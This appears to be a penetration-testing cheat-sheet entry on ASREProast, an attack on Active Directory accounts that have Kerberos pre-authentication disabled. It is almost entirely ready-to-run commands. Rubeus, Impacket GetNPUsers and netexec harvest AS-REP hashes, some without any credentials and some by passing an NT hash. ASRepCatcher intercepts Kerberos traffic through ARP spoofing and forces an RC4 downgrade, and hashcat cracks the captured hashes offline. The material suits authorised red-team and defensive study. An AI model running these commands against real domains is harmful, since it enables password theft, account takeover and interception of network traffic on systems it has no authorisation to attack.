---
technique: ASREProast
category: kerberos
targets: User accounts with DONT_REQ_PREAUTH
protocols: Kerberos
remote_capable: true
tags: kerberos asreproast preauth tgt cracking ad
---

# ASREProast

Accounts with Kerberos pre-authentication disabled respond to AS-REQ messages without verifying the caller's identity. The KDC's AS-REP contains a session key encrypted with the account's NT hash. An attacker can capture that encrypted blob and crack it offline without any prior foothold, though enumerating which accounts are vulnerable does require valid credentials.

## Windows

### Rubeus

#powershell #asreproast

Enumerate and roast all accounts with pre-authentication disabled, outputting hashes in hashcat format.

```powershell title:"ASREProast all DONT_REQ_PREAUTH accounts with Rubeus"
.\Rubeus.exe asreproast /format:hashcat /outfile:ASREProastables.txt
```
<!-- cheat
var outfile = ASREProastables.txt
-->

## Linux

### GetNPUsers

#impacket #kerberos #ldap

Enumerate DONT_REQ_PREAUTH accounts via LDAP and request their AS-REP hashes for offline cracking.

```sh title:"ASREProast accounts via GetNPUsers (authenticated)"
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -dc-ip "$rhost_ip" "$domain/$user"
```
<!-- cheat
import domain_ip
import users
var nt_hash
-->

### GetNPUsers (unauthenticated)

#impacket #kerberos #unauthenticated

Request AS-REP hashes for a supplied user list without any domain credentials.

```sh title:"ASREProast from a user list without credentials"
GetNPUsers.py -usersfile "$users_file" -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$rhost_ip" "$domain/"
```
<!-- cheat
import domain_ip
var users_file
-->

### netexec

#ldap #asreproast

Enumerate and capture AS-REP hashes via netexec.

```sh title:"ASREProast via netexec LDAP"
nxc ldap "$rhost_ip" -u "$user" $auth_flags --asreproast ASREProastables.txt --kdcHost "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### ASRepCatcher

#mitm #arp #downgrade

Man-in-the-middle AS-REP traffic between clients and the DC, optionally forcing RC4 downgrade for faster cracking.

```sh title:"Relay AS-REP traffic and downgrade to RC4 via ARP spoofing"
ASRepCatcher relay -dc "$rhost_ip"
```
<!-- cheat
import domain_ip
-->

### hashcat

#cracking #offline

Crack captured AS-REP hashes with hashcat mode 18200.

```sh title:"Crack ASREProast hashes with hashcat"
hashcat -m 18200 -a 0 ASREProastables.txt "$wordlist"
```
<!-- cheat
var wordlist
-->
